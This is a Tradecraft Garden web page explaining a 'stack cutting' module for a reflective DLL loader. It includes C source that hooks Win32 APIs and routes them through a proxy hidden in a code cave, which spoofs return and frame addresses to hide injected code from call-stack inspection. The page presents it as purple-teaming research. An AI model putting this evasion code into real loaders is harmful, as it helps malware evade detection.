# https://tradecraftgarden.org/stackcutting.html

Tradecraft Garden

## Stack Cutting

This is a [Simple Loader (Hooking)](https://tradecraftgarden.org/simplehook.html) module to push sensitive Win32 API calls through a stack-cutting call proxy.

### Project Files

[üìï¬† LICENSE.txt](https://tradecraftgarden.org/stackcutting.html#) [üî®¬† Makefile](https://tradecraftgarden.org/stackcutting.html#) [üìÉ¬† proxy.c](https://tradecraftgarden.org/stackcutting.html#) [üìÉ¬† proxy.h](https://tradecraftgarden.org/stackcutting.html#) [üìÉ¬† stackcut.c](https://tradecraftgarden.org/stackcutting.html#) [üìÉ¬† stackcut\_setup.c](https://tradecraftgarden.org/stackcutting.html#) [üîÆ¬† stackcutting.spec](https://tradecraftgarden.org/stackcutting.html#) [üìÉ¬† tcg.h](https://tradecraftgarden.org/stackcutting.html#)

### NOTES

#### Inherited Architecture

This is a module for [Simple Loader (Hooking)](https://tradecraftgarden.org/simplehook.html). To run it, use:

./link loader.spec demo/test.x64.dll out.bin %HOOKS="modules/stackcutting/stackcutting.spec"

#### The Proxy

_proxy.c_ is our call proxy. It's position-independent code. Its only job is to munge the stack, call a Win32 API function with the right arguments, fix the stack, and return the result.

Our goal, in this fixing process, is to create the illusion of a full stack (e.g., `RtlUserThreadStart` on down) without the walked frames containing our DLL loader, injected DLL, and other things in between. I call this stack cutting, because I'm cutting the bad frames out.

![](https://tradecraftgarden.org/ss_badbarber_messagebox.jpg)

_[System Informer](https://systeminformer.com/) screenshot comparing the callstack of [Simple Loader](https://tradecraftgarden.org/simple.html) to this project using test.x64.dll_

#### Finding a Valid Frame

For this to work, we need a valid stack frame to point things to. In this example, I simply [grabbed](https://tradecraftgarden.org/stackcutting.html?file=stackcut_setup.c#:~:text=void%20go%28%29) the return address and frame pointer for our DLL loader's caller. I then propagate these to eventually reach the proxy function.

This depends on the loader executing from a context where sane frames come before it.

If this loader is fired via `CreateRemoteThread`, we may find ourselves in a context where we don't have a good frame behind us. If we spam a return address without a good frame pointer, our stack unwinding becomes less than predictable. This implementation [detects](https://tradecraftgarden.org/stackcutting.html?file=stackcut.c#:~:text=if%20%28frameaddr%20%3D%3D%200%29%20%7B) this situation, and opts to NULL the return address and frame pointer, when the caller context frame pointer is NULL. This won't give us the illusion of a complete callstack, but in many situations, the stack unwinding should stop at our proxy function--giving us a truncated stack.

#### Hiding the Call proxy

Even with a valid frame and some stack munging, we still have a problem. Our proxy function WILL show up in the callstack. It's position-independent code. We want to place it somewhere more advantageous than private memory. My solution was to [find](https://tradecraftgarden.org/stackcutting.html?file=stackcut_setup.c#:~:text=findCodeCave) a code cave (e.g., slack space between the .text section of a module and the nearest page size) to store the PIC. Here, I try the executable module itself, and if it's not big enough I try kernel32. If neither work, I just VirtualAlloc unbacked memory. I wouldn't choose kernel32 for production use, but the pattern of trying modules until one you like works is demonstrated in this code.

`go` in _stackcut\_setup.c_ is where the call proxy is setup. Setting this proxy up happens before the loader `init` logic is called.

#### Cutting the Stack

When I started this project, I sought to reproduce Mariusz Banach's results from [ThreadStack Spoofer](https://github.com/mgeeky/ThreadStackSpoofer). I expected that I could set my call proxy's stack-stored frame address and return address 0 and this would stop the stack walking. Better, I hypothesized that if I updated both to VALID values, much further up the stack, I could create the illusion of a complete callstack.

My hypothesis didn't go as planned.

For x86 things worked as expected. x64? Not so much.

Why? The call proxy lives in a position-independent context. It's stack does not unwind the same way as a function baked into a compiled executable. Why? Because there's no .pdata section with UNWIND\_INFO structures to assist this process. Why do we have a .pdata section? Because unwinding an x64 stack without it requires a lot of guesswork. Commonly, this guess work is carried out by APIs like [StackWalk64](https://learn.microsoft.com/en-us/windows/win32/api/dbghelp/nf-dbghelp-stackwalk64).

To fool the stack walking algorithm (when there's no .pdata), I found I had to set the frame address and return address as I did before BUT I also had to [place](https://tradecraftgarden.org/stackcutting.html?file=proxy.c#:~:text=spoofme.retaddr) the desired return address at the top of (bottom-most memory address) of my proxy function's frame.

This works, but there's another problem. This space at the top of the frame is the x64 shadow space, for the callee function to use (as it wishes), to save register content. If the callee overwrites our spammed return value, the illusion breaks. Sometimes, it breaks in a way where the unwinding just terminates at our proxy function. Sometimes, it breaks in a way that's more suspicious. It depends on what the callee puts into that first slot.

Sometimes, we can work around the above problem. For example `KERNEL32$Sleep` stomps this slot with the `ebx` register content. This is easy to work with. We just [write](https://tradecraftgarden.org/stackcutting.html?file=proxy.c#:~:text=fixrbx) our desired return address to `ebx` and `KERNEL32$Sleep` will put it where we want it.

But, some functions (e.g., VirtualAlloc) stomp this slot with a register meant for argument passing. We can't overwrite that. Fortunately, in the `VirtualAlloc` case, the result is to terminate our stack unwinding at our proxy function. One way to work around this, might be to call another function that cooperates better (e.g., directly going to `NtAllocateVirtualMemory`).

I share the above to warn that this implementation is by no means universal and it doesn't give the stack illusion with every Win32 API call. It requires some quality time in a debugger validating the result.

#### Hooking Win32 APIs

_stackcutting.spec_ implements the callable labels **setup** and **hooks** to satisfy [Simple Loader (Hooking)](https://tradecraftgarden.org/simplehook.html)'s contract to layer tradecraft on top of a base loader.

This module hooks VirtualAlloc, VirtualProtect, LoadLibraryA, Sleep, and MessageBoxA. The only task for these hooks is to push the hooked functionns and their arguments through the stack cutting call proxy.

One piece of gymnastics is that stack cutting hard requires that it's setup function is the entry point for the loader. _stackcutting.spec_ uses remap to get rid of the original go() function before merging its code (with a new go()) function. redirect is used as well to change local references to the renamed go() to the new go() function.

#### PIC Hooking Inception

The hooking in this tradecraft isn't just for the DLL though! `attach "KERNEL32$VirtualAlloc" "_cVirtualAlloc"` ( _stackcut\_setup.spec_) rewrites VirtualAlloc API calls in our DLL loader to local \_cVirtualAlloc calls. The same happens with `LoadLibraryA` too. This is our tradecraft getting underneath its own program to push these calls through our stack cutting proxy.

While this self-hooking inception is cool, it has risks. _stackut.spec_'s **setup** attaches to several functions. `SetupProxy` calls VirtualProtect and (potentially) VirtualAlloc. Both are hooked. But, we don't want these calls in `SetupProxy` hooked because the proxy isn't initialized yet. `optout "SetupProxy" "_cVirtualAlloc, _cVirtualProtect"` mitigates this by preventing Stack Cutting's hooks from affecting this function. Crucially, optout does allow other tradecraft modules to potentially instrument `SetupProxy`.

#### Design Decision: Global Variables in PIC

I made the decision to use global variables in this rewrite of stack cutting. These variables keep track of our spoofed return address, frame address, and the call proxy itself.

They're not necessary to setup the Stack Cutting feature from PIC. You could call SetupProxy from PIC and pass it onto the hooking PICO without a global.

What we gain using global variables is our _stackcut.c_ code works as-is in our DLL loader AND merged with our PICO hooking module.

While PIC does not normally have transparent access to global variables, Crystal Palace can restore .bss global variables with a `fixbss` helper function. The specific tradecraft choice and implementation is handled by the [PIC services module](https://tradecraftgarden.org/simplepic.html) run by loader.spec.

In some operations contexts, you might choose to give up some modularity to avoid global variables in a loader. In a tradecraft demonstration context (e.g., purple teaming), I believe this modularity, speed of implementation, and easy inception to unify PIC and DLL tradecraft is worth using globals. YMMV.
**Conversation**

- [Writing a Debugger From Scratch - DbgRs Part 6 - Stacks](https://www.timdbg.com/posts/writing-a-debugger-from-scratch-part-6/) (2023) by Tim Misiak. A gentle introduction to stack unwinding, Frame Pointer Omission, and using .pdata/UNWIND info written from the context of writing a debugger.
- [ThreadStackSpoofer](https://github.com/mgeeky/ThreadStackSpoofer) (2021) by Mariusz Banach is a similar POC to hook the `Sleep` function, stomp the return address to 0, call `SleepEx`, and return.

### License

This project is licensed under the [BSD License](https://opensource.org/license/bsd-3-clause).

## Stack Cutting

[üîô](https://tradecraftgarden.org/stackcutting.html#)
tcg.h
[üîó](https://tradecraftgarden.org/stackcutting.html?file=tcg.h)

[?](https://tradecraftgarden.org/stackcutting.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`// used by both the Pico Loader and DLL loader`<br>`typedef``struct``{`<br>```__typeof__(LoadLibraryA)¬†¬† * LoadLibraryA;`<br>```__typeof__(GetProcAddress) * GetProcAddress;`<br>`} IMPORTFUNCS;`<br>`// linker intrinsic to map a function hash to a hook registered via Crystal Palace`<br>`FARPROC __resolve_hook(``DWORD``funcHash);`<br>`/*`<br>```* Structs used by our DLL loader`<br>```*/`<br>`#define PTR_OFFSET(x, y) ( (void *)(x) + (ULONG)(y) )`<br>`#define DEREF( name )*(UINT_PTR *)(name)`<br>`typedef``struct``{`<br>```IMAGE_DOS_HEADER¬†¬†¬†¬†¬† * DosHeader;`<br>```IMAGE_NT_HEADERS¬†¬†¬†¬†¬† * NtHeaders;`<br>```IMAGE_OPTIONAL_HEADER * OptionalHeader;`<br>`} DLLDATA;`<br>`/*`<br>```* utility functions`<br>```*/`<br>`DWORD``adler32sum(unsigned``char``* buffer,``DWORD``length);`<br>`DWORD``ror13hash(``const``char``* c);`<br>`/*`<br>```* printf-style debugging.`<br>```*/`<br>`void``dprintf(``char``* format, ...);`<br>`/*`<br>```* PICO running functions`<br>```*/`<br>`typedef``void``(*PICOMAIN_FUNC)(``char``* arg);`<br>`PICOMAIN_FUNC PicoGetExport(``char``* src,``char``* base,``int``tag);`<br>`PICOMAIN_FUNC PicoEntryPoint(``char``* src,``char``* base);`<br>`int``PicoCodeSize(``char``* src);`<br>`int``PicoDataSize(``char``* src);`<br>`void``PicoLoad(IMPORTFUNCS * funcs,``char``* src,``char``* dstCode,``char``* dstData);`<br>`/*`<br>```* Resolve functions by walking the export address table`<br>```*/`<br>`FARPROC findFunctionByHash(``HANDLE``hModule,``DWORD``wantedFunctionHash);`<br>`HANDLE``findModuleByHash(``DWORD``moduleHash);`<br>`/*`<br>```* DLL parsing and loading functions`<br>```*/`<br>`typedef``BOOL``WINAPI (*DLLMAIN_FUNC)(``HINSTANCE``,``DWORD``,``LPVOID``);`<br>`DLLMAIN_FUNC EntryPoint(DLLDATA * dll,``void``* base);`<br>`IMAGE_DATA_DIRECTORY * GetDataDirectory(DLLDATA * dll,``UINT``entry);`<br>`void``LoadDLL(DLLDATA * dll,``char``* src,``char``* dst);`<br>`void``LoadSections(DLLDATA * dll,``char``* src,``char``* dst);`<br>`void``ParseDLL(``char``* src, DLLDATA * data);`<br>`void``ProcessImports(IMPORTFUNCS * funcs, DLLDATA * dll,``char``* dst);`<br>`void``ProcessRelocations(DLLDATA * dll,``char``* src,``char``* dst);`<br>`DWORD``SizeOfDLL(DLLDATA * data);`<br>`/*`<br>```* A macro to figure out our caller`<br>```* https://github.com/rapid7/ReflectiveDLLInjection/blob/81cde88bebaa9fe782391712518903b5923470fb/dll/src/ReflectiveLoader.c#L34C1-L46C1`<br>```*/`<br>`#ifdef __MINGW32__`<br>`#define WIN_GET_CALLER() __builtin_extract_return_addr(__builtin_return_address(0))`<br>`#else`<br>`#pragma intrinsic(_ReturnAddress)`<br>`#define WIN_GET_CALLER() _ReturnAddress()`<br>`#endif` |

## Stack Cutting

[üîô](https://tradecraftgarden.org/stackcutting.html#)
stackcut.c
[üîó](https://tradecraftgarden.org/stackcutting.html?file=stackcut.c)

[?](https://tradecraftgarden.org/stackcutting.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122<br>123<br>124<br>125<br>126<br>127<br>128<br>129<br>130<br>131<br>132<br>133<br>134<br>135<br>136<br>137<br>138<br>139<br>140<br>141<br>142<br>143<br>144<br>145<br>146<br>147<br>148 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS √É¬¢√Ç‚Ç¨√Ç≈ìAS IS√É¬¢√Ç‚Ç¨√Ç¬ù AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`#include <windows.h>`<br>`#include "tcg.h"`<br>`#include "proxy.h"`<br>`WINBASEAPI``VOID``WINAPI KERNEL32$Sleep (``DWORD``dwMilliseconds);`<br>`WINBASEAPI``LPVOID``WINAPI KERNEL32$VirtualAlloc (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flAllocationType,``DWORD``flProtect);`<br>`WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flNewProtect, PDWORD lpflOldProtect);`<br>`WINUSERAPI``int``WINAPI USER32$MessageBoxA(``HWND``hWnd,``LPCSTR``lpText,``LPCSTR``lpCaption,``UINT``uType);`<br>`/*`<br>```* GLOBALS`<br>```*/`<br>`PROXY¬†¬†¬†¬† CallProxy;`<br>`PROXYCALL call;`<br>`ULONG_PTR``proxy(``int``argc) {`<br>```call.argc¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† = argc;`<br>```return``CallProxy(&call);`<br>`}`<br>`/*`<br>```* HOOKS`<br>```*/`<br>`HMODULE``WINAPI _cLoadLibraryA (``LPCSTR``lpLibFileName) {`<br>```call.function = (``ULONG_PTR``)LoadLibraryA;`<br>```call.args[0]¬† = (``ULONG_PTR``)lpLibFileName;`<br>```return``(``HMODULE``)proxy(1);`<br>`}`<br>`int``WINAPI _cMessageBoxA(``HWND``hWnd,``LPCSTR``lpText,``LPCSTR``lpCaption,``UINT``uType) {`<br>```call.function = (``ULONG_PTR``)USER32$MessageBoxA;`<br>```call.args[0]¬† = (``ULONG_PTR``)hWnd;`<br>```call.args[1]¬† = (``ULONG_PTR``)lpText;`<br>```call.args[2]¬† = (``ULONG_PTR``)lpCaption;`<br>```call.args[3]¬† = (``ULONG_PTR``)uType;`<br>```return``(``int``)proxy(4);`<br>`}`<br>`VOID``WINAPI _cSleep (``DWORD``dwMilliseconds) {`<br>```call.function = (``ULONG_PTR``)KERNEL32$Sleep;`<br>```call.args[0]¬† = (``ULONG_PTR``)dwMilliseconds;`<br>```proxy(1);`<br>`}`<br>`LPVOID``WINAPI _cVirtualAlloc (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flAllocationType,``DWORD``flProtect) {`<br>```call.function = (``ULONG_PTR``)KERNEL32$VirtualAlloc;`<br>```call.args[0]¬† = (``ULONG_PTR``)lpAddress;`<br>```call.args[1]¬† = (``ULONG_PTR``)dwSize;`<br>```call.args[2]¬† = (``ULONG_PTR``)flAllocationType;`<br>```call.args[3]¬† = (``ULONG_PTR``)flProtect;`<br>```return``(``LPVOID``)proxy(4);`<br>`}`<br>`WINBOOL WINAPI _cVirtualProtect (``LPVOID``lpAddress,``SIZE_T``dwSize,``DWORD``flNewProtect, PDWORD lpflOldProtect) {`<br>```call.function = (``ULONG_PTR``)KERNEL32$VirtualProtect;`<br>```call.args[0]¬† = (``ULONG_PTR``)lpAddress;`<br>```call.args[1]¬† = (``ULONG_PTR``)dwSize;`<br>```call.args[2]¬† = (``ULONG_PTR``)flNewProtect;`<br>```call.args[3]¬† = (``ULONG_PTR``)lpflOldProtect;`<br>```return``(WINBOOL)proxy(4);`<br>`}`<br>`/*`<br>```* SETUP PROCESS`<br>```*/`<br>`void``setupHooks(``char``* srchooks,``char``* dsthooks, DLLDATA * data,``char``* dstdll);`<br>`/* this is a linker intrinsic to get the tag of our confighooks export function. */`<br>`int``__tag_configstackcutting();`<br>`/* function prototype for our stackcutting PICO setup thing */`<br>`typedef``void``(*PICO_CONFIG_STACKCUTTING)(PROXY proxy,``char``* retaddr,``char``* frameaddr);`<br>`/*`<br>```* Implement the setupHooks function called by loader.c--which is our chance to call our exported config function.`<br>```* We do this here because this is where our global vars with the stack cutting info live`<br>```*/`<br>`void``setupHooksStackCutting(``char``* srchooks,``char``* dsthooks, DLLDATA * data,``char``* dstdll) {`<br>```/* call the function exported by our PICO */`<br>```((PICO_CONFIG_STACKCUTTING)PicoGetExport(srchooks, dsthooks, __tag_configstackcutting())) (CallProxy, (``char``*)call.spoofme.retaddr, (``char``*)call.spoofme.frameaddr);`<br>```/* continue the chain */`<br>```setupHooks(srchooks, dsthooks, data, dstdll);`<br>`}`<br>`/*`<br>```* EXPORT`<br>```*/`<br>`/* receive a configuration from elsewhere.. we export this function */`<br>`void``configstackcutting(PROXY proxy,``char``* retaddr,``char``* frameaddr) {`<br>```/*`<br>```* Keep track of the return address and frame pointer from the context that called our loader. These are`<br>```* the values we are going to "spoof" later on.`<br>```*`<br>```* Note, I've opted to detect when the framepointer is NULL, and use that as a clue that our execution`<br>```* started from a context without a good frame behind us (e.g., CreateRemoteThread). In these situations,`<br>```* if we spam the return address without a valid frame pointer--we're going to get a stack unwinding that's`<br>```* less predictable.`<br>```*`<br>```* By opting to NULL the return address when the frame pointer is null, my goal is to, at least, get a`<br>```* truncated call stack in these situations.`<br>```*/`<br>```if``(frameaddr == 0) {`<br>```call.spoofme.retaddr¬†¬† = (``ULONG_PTR``)retaddr;`<br>```call.spoofme.frameaddr = (``ULONG_PTR``)frameaddr;`<br>```}`<br>```else``{`<br>```call.spoofme.retaddr¬†¬† = (``ULONG_PTR``)retaddr;`<br>```call.spoofme.frameaddr = (``ULONG_PTR``)frameaddr;`<br>```}`<br>```/* set our call proxy too */`<br>```CallProxy = proxy;`<br>`}` |

## Stack Cutting

[üîô](https://tradecraftgarden.org/stackcutting.html#)
proxy.c
[üîó](https://tradecraftgarden.org/stackcutting.html?file=proxy.c)

[?](https://tradecraftgarden.org/stackcutting.html#)

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77<br>78<br>79<br>80<br>81<br>82<br>83<br>84<br>85<br>86<br>87<br>88<br>89<br>90<br>91<br>92<br>93<br>94<br>95<br>96<br>97<br>98<br>99<br>100<br>101<br>102<br>103<br>104<br>105<br>106<br>107<br>108<br>109<br>110<br>111<br>112<br>113<br>114<br>115<br>116<br>117<br>118<br>119<br>120<br>121<br>122 | `/*`<br>```* Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild`<br>```*`<br>```* Redistribution and use in source and binary forms, with or without modification, are`<br>```* permitted provided that the following conditions are met:`<br>```*`<br>```* 1. Redistributions of source code must retain the above copyright notice, this list of`<br>```* conditions and the following disclaimer.`<br>```*`<br>```* 2. Redistributions in binary form must reproduce the above copyright notice, this list of`<br>```* conditions and the following disclaimer in the documentation and/or other materials provided`<br>```* with the distribution.`<br>```*`<br>```* 3. Neither the name of the copyright holder nor the names of its contributors may be used to`<br>```* endorse or promote products derived from this software without specific prior written`<br>```* permission.`<br>```*`<br>```* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS √É¬¢√Ç‚Ç¨√Ç≈ìAS IS√É¬¢√Ç‚Ç¨√Ç¬ù AND ANY EXPRESS`<br>```* OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF`<br>```* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE`<br>```* COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,`<br>```* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF`<br>```* SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)`<br>```* HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR`<br>```* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,`<br>```* EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`<br>```*/`<br>`#include <windows.h>`<br>`#include "proxy.h"`<br>`typedef``ULONG_PTR``WINAPI (*CALL0)();`<br>`typedef``ULONG_PTR``WINAPI (*CALL1)(``ULONG_PTR``);`<br>`typedef``ULONG_PTR``WINAPI (*CALL2)(``ULONG_PTR``,``ULONG_PTR``);`<br>`typedef``ULONG_PTR``WINAPI (*CALL3)(``ULONG_PTR``,``ULONG_PTR``,``ULONG_PTR``);`<br>`typedef``ULONG_PTR``WINAPI (*CALL4)(``ULONG_PTR``,``ULONG_PTR``,``ULONG_PTR``,``ULONG_PTR``);`<br>`ULONG_PTR``proxy(PROXYCALL * call) {`<br>```ULONG_PTR``result;`<br>```/* grab and backup our previous frame ptr and ret addr */`<br>```call->temp.p_frame¬†¬†¬† = (FRAME *)__builtin_frame_address(0);`<br>```call->temp.frame¬†¬†¬†¬†¬† = *(call->temp.p_frame);`<br>```/* spoof our frame address and return address */`<br>```*(call->temp.p_frame) = call->spoofme;`<br>`#ifdef WIN_X64`<br>```/* And, what is... going on... HERE...`<br>```*`<br>```* This is the guesswork of Raphael, his limited knowledge, and alone time with`<br>```* a debugger. I had high hopes. I could just FIX the damned frame pointer and`<br>```* stack pointer and suddenly... suddenly... my stack would look AWESOME.`<br>```*`<br>```* But, that's not what happened. :(`<br>```*`<br>```* The CPU isn't the judge here. It follows the instructions and does what it`<br>```* does. We're up against StackWalk, which is a mix of reading .pdata (not`<br>```* applicable here) and making guesses.`<br>```*`<br>```* When its assumptions break, it starts to try to treat everything as a return`<br>```* address before it gives up. It's much more complicated than that (from my quick`<br>```* read of ReactOS code).`<br>```*`<br>```* So, first things first, let's set our desired return address to the very top`<br>```* of the frame (bottom most address). This is DEPENDENT on the number of local`<br>```* vars. So, you'll need to read the pre-amble to this function (if you change it)`<br>```* to determine where that's at.`<br>```*`<br>```* x86_64-w64-mingw32-objdump -d proxy.x64.o`<br>```*`<br>```* 0000000000000000 <proxy>:`<br>```* 0:¬†¬† 55¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† push¬†¬† %rbp`<br>```* 1:¬†¬† 48 89 e5¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† mov¬†¬†¬† %rsp,%rbp`<br>```* 4:¬†¬† 53¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† push¬†¬† %rbx`<br>```* 5:¬†¬† 48 83 ec 38¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† sub¬†¬†¬† $0x38,%rsp`<br>```*`<br>```* We push rbx (8b) and create 0x38 (56b) of stack space. So, 64 / 8--we want to`<br>```* stick our return address at -8 from our frame address (rbp).`<br>```*/`<br>```*((``ULONG_PTR``*)__builtin_frame_address(0) - 8) = call->spoofme.retaddr;`<br>```/* Oh, but our hell isn't done yet. You see, some functions use that lovely space`<br>```* at the top of our frame (shadow space) to store some non-volatile / callee saved`<br>```* registers. Not all. But, some do. And when that happens, my carefully crafted`<br>```* plans fall apart and the above value gets STOMPED breaking our illusion.`<br>```*`<br>```* What's an example of a function that does this? Sleep/SleepEx.`<br>```*`<br>```* What's an example of a function you're guaranteed to try to hook to see if this`<br>```* works? Sleep/SleepEx.`<br>```*`<br>```* So, here's the fix for that... find the register that's propagating back to our`<br>```* shadow space in the frame and set it to our return address. Things will work out`<br>```* fine after doing this. */`<br>```register``ULONG_PTR``fixrbx asm(``"rbx"``) __attribute__((unused)) = call->spoofme.retaddr;`<br>`#else`<br>```/* for ONCE, x86 isn't the problem */`<br>`#endif`<br>```/* let's make our proxied call (separate of this stack munging nonsense) */`<br>```if``(call->argc == 0) {`<br>```result = ((CALL0)call->function)();`<br>```}`<br>```else``if``(call->argc == 1) {`<br>```result = ((CALL1)call->function)(call->args[0]);`<br>```}`<br>```else``if``(call->argc == 2) {`<br>```result = ((CALL2)call->function)(call->args[0], call->args[1]);`<br>```}`<br>```else``if``(call->argc == 3) {`<br>```result = ((CALL3)call->function)(call->args[0], call->args[1], call->args[2]);`<br>```}`<br>```else``if``(call->argc == 4) {`<br>```result = ((CALL4)call->function)(call->args[0], call->args[1], call->args[2], call->args[3]);`<br>```}`<br>```/* restore our previous frame ptr and ret addr */`<br>```*(call->temp.p_frame) = call->temp.frame;`<br>```return``result;`<br>`}` |

## Stack Cutting

[üîô](https://tradecraftgarden.org/stackcutting.html#)
Makefile
[üîó](https://tradecraftgarden.org/stackcutting.html?file=Makefile)

[?](https://tradecraftgarden.org/stackcutting.html#)

|     |     |
| --- | --- |
